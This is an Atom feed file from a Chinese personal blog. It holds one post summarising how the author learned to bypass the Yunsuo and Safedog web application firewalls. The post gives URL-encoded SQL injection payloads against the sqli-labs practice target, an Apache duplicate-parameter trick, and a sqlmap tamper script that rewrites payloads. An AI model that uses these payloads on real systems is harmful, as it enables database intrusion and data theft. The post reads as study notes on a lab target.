@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>未尽的博客</title>
+  
+  <subtitle>学习不需要理由</subtitle>
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2021-04-05T11:10:07.025Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>未尽</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Bypass WAF</title>
+    <link href="http://example.com/2021/04/04/Bypass-WAF/"/>
+    <id>http://example.com/2021/04/04/Bypass-WAF/</id>
+    <published>2021-04-04T10:18:25.000Z</published>
+    <updated>2021-04-05T11:10:07.025Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近学习了一下如何绕WAF，简单总结一下</p><span id="more"></span><h2 id="云锁绕过"><a href="#云锁绕过" class="headerlink" title="云锁绕过"></a>云锁绕过</h2><p>在测试中，防火墙会检测内联注释，当使用其它注释符进行绕过时，一旦闭合注释符或用%0a来跳出单行注释，都会引起防火墙的拦截，只有在注释符内的语句，防火墙才不会拦截，这里要感谢一位师傅给的<a href="http://www.alexsel.com/index.php/archives/77/">思路</a>，既然这样只要想办法让注释符失去作用就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less-1&#x2F;?id&#x3D;-1%23&#39; union select 1,2,3;--+</span><br></pre></td></tr></table></figure><img src="/assets/photo/Bypass WAF/bypass-waf-1.png"><p>编写tamper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^\S.*?(?=\s)&#x27;</span>)</span><br><span class="line">    payload = re.sub(pattern, <span class="string">&quot;-1%23&#x27;&quot;</span>, payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="绕狗"><a href="#绕狗" class="headerlink" title="绕狗"></a>绕狗</h2><p>安全狗绕过可以通过模糊测试，然后再闭合模糊测试产生的注释符，有一点需要注意的是，在模糊测试的过程中，一条语句可能会产生多个注释符号，当内联注释符（/*!*/)和多行注释符（/**/）在一起时，虽然能绕过WAF，但可能导致注入语句无法正常执行。</p><p><img src="/assets/photo/Bypass WAF/1.png"><br></p><img src="/assets/photo/Bypass WAF/2.png"><p>还有一种在命令行界面测试没有问题，但是注入却无法执行。</p><p><img src="/assets/photo/Bypass WAF/3.png"><br><br><img src="/assets/photo/Bypass WAF/4.png"></p><p>通过测试得到联合注入语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union%23%0a--%0ball%23%0aall%20select%201,2,table_name%20from%20%23--+%0a&#x2F;*!33212--+&#x2F;*%0ainformation_schema.tables%23*&#x2F;%23&#x2F;*!%0awhere%20table_schema&#x3D;database()*&#x2F;;%23</span><br></pre></td></tr></table></figure><p>还可以利用 Apache 的特性，相同参数读取最后一个。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less-1&#x2F;?id&#x3D;-1&#x2F;*&amp;id&#x3D;-1&#39; union select 1,2,3;--+*&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;最近学习了一下如何绕WAF，简单总结一下&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="WAF" scheme="http://example.com/tags/WAF/"/>
+    
+  </entry>
+  
+</feed>
